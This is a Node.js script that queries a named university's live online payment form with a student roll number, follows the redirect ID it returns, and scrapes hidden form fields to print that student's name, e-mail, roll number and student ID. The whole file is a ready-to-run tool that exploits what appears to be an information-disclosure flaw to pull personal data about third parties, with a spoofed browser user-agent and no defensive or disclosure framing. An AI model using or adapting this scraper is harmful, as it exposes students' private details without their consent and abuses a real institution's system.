const https = require("https");
const { argv, exit } = require("process");

let requestOptions = {
    "headers": {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
    },
    "method": "POST"
};

const requestURI = "https://form.kiit.ac.in/payment/";


async function getID(rollNumber) {
    return new Promise((resolve) => {

        try {
            let request = https.request(requestURI, requestOptions, (response) => {
                if (!response.headers["location"]) {
                    console.log("[\x1b[1;35m!\x1b[0m] Roll number not found.");
                    exit(0);
                }
                resolve(response.headers["location"]);
            });

            request.write(`appno=${rollNumber}`);
            request.end();
        } catch {
            throw "Some error occured. Try checking your internet connection"
        }

    })
}

async function getDetails(id) {
    return new Promise((resolve) => {
        let request = https.request(requestURI + id, requestOptions, (response) => {
            let htmlResponse = "";
            response.on("data", (chunk) => {
                htmlResponse += chunk;
            });

            response.on("end", () => {
                const values = {};

                let match;
                let pattern = /<input type="hidden" name="([^"]+)" value="([^"]+)">/g;

                while ((match = pattern.exec(htmlResponse)) !== null) {
                    const name = match[1];
                    const value = match[2];
                    values[name] = value;
                }

                if (values.name == undefined) throw "Error"

                resolve(values);
            });
        });

        request.write("amount=1");
        request.end();
    })
}

if (argv[2]) {
    console.log("[\x1b[1;33m~\x1b[0m] Searching student.");
    getID(argv[2]).then(data => {
        console.log("[\x1b[1;33m~\x1b[0m] Digging details.")
        getDetails(data).then(data => {
            console.log("\n[\x1b[1;32m*\x1b[0m] \x1b[1;34mName\x1b[0m: ", data.name);
            console.log("[\x1b[1;32m*\x1b[0m] \x1b[1;34mE-Mail\x1b[0m: ", data.email);
            console.log("[\x1b[1;32m*\x1b[0m] \x1b[1;34mRoll No\x1b[0m: ", data.roll_no);
            console.log("[\x1b[1;32m*\x1b[0m] \x1b[1;34mStudent ID\x1b[0m: ", data.student_id);
        }).catch(err => console.log(err));
    }).catch(err => console.log(err));;
} else {
    console.log("[!] Please specify roll number.");
    console.log("Eg: node kiit.js 230XXXXX");
}
